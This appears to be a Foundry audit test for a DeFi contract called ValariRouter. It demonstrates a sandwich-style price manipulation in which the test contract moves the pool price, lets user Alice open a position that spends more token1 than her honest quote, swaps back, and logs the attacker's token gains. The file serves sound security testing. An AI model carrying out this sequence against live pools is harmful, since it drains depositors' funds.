// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import {ValariRouterTest} from "./ValariRouter.t.sol";
import {ValariRouter} from "../src/ValariRouter.sol";

contract ValariRouterScratchAuditTest is ValariRouterTest {
    function testScratchUpwardLiquidityManipulation() public {
        _open(bob, 1_000 ether, 1_000 ether, -600, 1800);

        ValariRouter.DepositQuote memory honest =
            router.previewDeposit(poolId, 1 ether, 100 ether, 600, 1200);
        uint256 attackerBefore0 = token0.balanceOf(address(this));
        uint256 attackerBefore1 = token1.balanceOf(address(this));
        manager.unlock(abi.encode(false, false, uint256(100 ether), uint256(0)));
        uint256 token0Out = token0.balanceOf(address(this)) - attackerBefore0;
        ValariRouter.DepositQuote memory manipulated =
            router.previewDeposit(poolId, 1 ether, 100 ether, 600, 1200);

        emit log_named_uint("honest liquidity", honest.liquidity);
        emit log_named_uint("manipulated liquidity", manipulated.liquidity);
        emit log_named_uint("honest amount0", honest.amount0);
        emit log_named_uint("honest amount1", honest.amount1);
        emit log_named_uint("manipulated amount0", manipulated.amount0);
        emit log_named_uint("manipulated amount1", manipulated.amount1);

        assertGt(manipulated.liquidity, honest.liquidity);
        vm.prank(alice);
        (uint256 id, uint128 minted, uint256 spent0, uint256 spent1) = router.openPosition(
            poolId, 1 ether, 100 ether, 600, 1200, honest.liquidity, block.timestamp
        );
        assertEq(minted, manipulated.liquidity);
        assertGt(spent1, honest.amount1);

        manager.unlock(abi.encode(false, true, token0Out, uint256(0)));
        ValariRouter.PositionView memory afterRestore = router.getPosition(id);
        emit log_named_uint("spent0", spent0);
        emit log_named_uint("spent1", spent1);
        emit log_named_uint("post-reversal amount0", afterRestore.amount0);
        emit log_named_uint("post-reversal amount1", afterRestore.amount1);
        emit log_named_uint("post-reversal fees0", afterRestore.fees0);
        emit log_named_uint("post-reversal fees1", afterRestore.fees1);
        emit log_named_int(
            "attacker token0 delta",
            int256(token0.balanceOf(address(this))) - int256(attackerBefore0)
        );
        emit log_named_int(
            "attacker token1 delta",
            int256(token1.balanceOf(address(this))) - int256(attackerBefore1)
        );
    }
}
